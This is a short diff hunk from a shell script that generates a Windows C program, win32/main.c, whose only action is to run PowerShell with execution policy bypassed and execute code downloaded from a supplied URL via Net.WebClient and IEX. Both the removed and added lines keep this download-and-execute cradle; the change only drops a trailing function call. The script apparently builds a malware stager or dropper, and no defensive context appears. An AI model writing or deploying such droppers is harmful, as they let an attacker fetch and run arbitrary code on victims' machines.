@@ -21,7 +21,7 @@ echo "$url"
 echo "Creating main.c..."
 echo "#include <stdio.h>" > win32/main.c
 echo "int main(){" >> win32/main.c
-echo "    system(\"powershell -executionpolicy bypass \\\"IEX (New-Object Net.WebClient).DownloadString('$url'); Main\\\"\");">> win32/main.c
+echo "    system(\"powershell -executionpolicy bypass \\\"IEX (New-Object Net.WebClient).DownloadString('$url'); \\\"\");">> win32/main.c
 echo "}" >> win32/main.c
 
 
